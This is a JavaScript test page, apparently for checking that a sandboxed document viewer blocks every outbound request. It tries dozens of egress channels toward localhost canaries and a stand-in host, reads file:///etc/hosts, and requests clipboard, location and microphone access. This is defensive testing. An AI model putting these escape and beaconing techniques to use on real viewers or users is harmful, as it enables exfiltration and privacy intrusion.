// The hostile test page of the viewer, from prototype p2's hostile.html. It learns where the
// canaries listen from ports.json (written by the test into the archive) and tries every way
// out it knows. Nothing here may reach a canary: the proxy, the interception and the content
// policy must refuse all of it, and the viewer must list where it tried to go.
//   A  a listener on 127.0.0.1      B  one on localhost (127.0.0.1 and ::1), also as canary.localhost
//   U  a UDP listener for STUN       U2 one for QUIC     NET a name on the internet (never resolvable)
async function ports() {
  const r = await fetch("ports.json");
  return r.json();
}
function targets(p) {
  return {
    A: (w) => `http://127.0.0.1:${p.A}/${w}`,
    B: (w) => `http://canary.localhost:${p.B}/${w}`,
    BL: (w) => `http://localhost:${p.B}/${w}`,
    NET: (w) => `http://uuu-outside.example/${w}`,
    NETS: (w) => `https://uuu-outside.example/${w}`,
    SN: (w) => `http://localhost:${location.port}/${w}`,
  };
}
async function tryEverything() {
  const p = await ports();
  const T = targets(p);
  try { localStorage.setItem("uuu", "1"); document.cookie = "uuu=1; max-age=9999999"; } catch (e) {}
  for (const [t, u] of Object.entries(T)) {
    const w = (way) => u(`${way}-${t}`);
    fetch(w("fetch"), { mode: "no-cors" }).catch(() => {});
    fetch(w("fetchcors")).catch(() => {});
    try { const x = new XMLHttpRequest(); x.open("GET", w("xhr")); x.send(); } catch (e) {}
    new Image().src = w("img");
    const s = document.createElement("script"); s.src = w("script"); document.head.append(s);
    const l = document.createElement("link"); l.rel = "stylesheet"; l.href = w("css"); document.head.append(l);
    const st = document.createElement("style");
    st.textContent = `@import url("${w("atimport")}"); @font-face { font-family: f${t}; src: url("${w("font")}"); } .bg${t} { background: url("${w("cssurl")}"); font-family: f${t}; }`;
    document.head.append(st);
    const d = document.createElement("div"); d.className = "bg" + t; d.textContent = "x"; document.body.append(d);
    const v = document.createElement("video"); v.src = w("video"); document.body.append(v);
    for (const rel of ["prefetch", "preconnect", "dns-prefetch", "preload"]) { const k = document.createElement("link"); k.rel = rel; k.href = w(rel); if (rel === "preload") k.as = "fetch"; document.head.append(k); }
    const fr = document.createElement("iframe"); fr.src = w("iframe"); fr.style.width = "10px"; document.body.append(fr);
    const f = document.createElement("form"); f.method = "POST"; f.action = w("form"); f.target = "sink"; f.innerHTML = '<input name="x" value="1">'; document.body.append(f); f.submit();
    const a = document.createElement("a"); a.href = "ports.json"; a.ping = w("ping"); a.target = "sink"; a.textContent = "p"; document.body.append(a); a.click();
    try { new WebSocket(w("ws").replace(/^http/, "ws")); } catch (e) {}
    try { navigator.sendBeacon(w("beacon"), "data"); } catch (e) {}
    try { const es = new EventSource(w("es")); es.onerror = () => es.close(); } catch (e) {}
    import(w("import")).catch(() => {});
    try { window.open(w("open"), "_blank"); } catch (e) {}
  }
  const list = encodeURIComponent(JSON.stringify(Object.values(T).map((u) => u("worker"))));
  try { new Worker(`worker.js?u=${list}`); } catch (e) {}
  try { navigator.serviceWorker.register(`worker.js?u=${list}`).catch(() => {}); } catch (e) {}
  try {
    const pc = new RTCPeerConnection({ iceServers: [{ urls: [`stun:127.0.0.1:${p.U}`, `stun:canary.localhost:${p.U}`] }] });
    pc.createDataChannel("x");
    await pc.setLocalDescription(await pc.createOffer());
  } catch (e) {}
  try { new WebTransport(`https://127.0.0.1:${p.U2}/wt`).ready.catch(() => {}); } catch (e) {}
  fetch("file:///etc/hosts").catch(() => {});
  const ff = document.createElement("iframe"); ff.src = "file:///etc/hosts"; document.body.append(ff);
  const dl = document.createElement("a"); dl.href = URL.createObjectURL(new Blob(["download"])); dl.download = "uuu-dl.txt"; document.body.append(dl); dl.click();
  try { navigator.clipboard.readText().catch(() => {}); } catch (e) {}
  try { navigator.geolocation.getCurrentPosition(() => {}, () => {}); } catch (e) {}
  try { navigator.mediaDevices.getUserMedia({ audio: true }).catch(() => {}); } catch (e) {}
  setTimeout(() => { alert("hi"); confirm("ok?"); prompt("x"); }, 100);
}
// The ways that move the whole page: one per page, by the name of the page.
async function moveAway(way) {
  const p = await ports();
  const to = `http://127.0.0.1:${p.A}/nav-${way}`;
  if (way === "location") location.href = to;
  else if (way === "meta") { const m = document.createElement("meta"); m.httpEquiv = "refresh"; m.content = `0;url=${to}`; document.head.append(m); }
  else if (way === "form") { const f = document.createElement("form"); f.method = "POST"; f.action = to; f.innerHTML = '<input name="x" value="1">'; document.body.append(f); f.submit(); }
  else if (way === "open") window.open(to, "_top");
}
